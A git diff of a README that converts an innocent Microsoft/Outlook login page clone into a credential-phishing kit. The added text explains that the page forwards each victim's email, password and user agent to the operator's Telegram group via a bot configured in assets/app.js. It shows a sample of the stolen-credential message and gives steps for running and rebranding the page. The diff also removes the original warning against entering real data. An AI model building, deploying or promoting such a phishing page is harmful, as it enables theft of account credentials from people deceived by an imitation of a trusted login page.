@@ -1,18 +1,22 @@
-## MICROSOFT LOGIN PAGE CLONE
+# Outlook-style login page (Telegram forwarding)
 
-This is a clone of the iconic login page for Microsoft (outlook) accounts with its form validation.
+Clone of the Microsoft/Outlook login page. When a user enters email and password and clicks **Sign in**, the page sends a message to your Telegram group with the email, password, and user agent.
 
-> In as much as this script does not process information submitted, please do not submit any personal information!
+## Usage
 
-> I DO NOT OWN the rights to any images used in this page!
-### ✨TECH-STACK
+Open `index.html` in a browser (or serve the folder with any static server). Use the form: email → Next → password → Sign in.
 
-- HTML
-- CSS
-- JavaScript
-  
-### 🔍 PREVIEW
+Your Telegram group receives a message like:
 
-Below is a short clip of what this clone looks like
+```
+🔐 Login
+Email: user@example.com
+Password: ••••••••
+User-Agent: Mozilla/5.0 ...
+```
 
-<img src="assets/preview.gif" alt="preview" />
+Bot token and chat ID are in `assets/app.js`. Change them there if you use a different bot or chat.
+
+## Customization
+
+Replace `assets/logo.png`, `assets/favicon.ico`, and text in `index.html` for your branding.
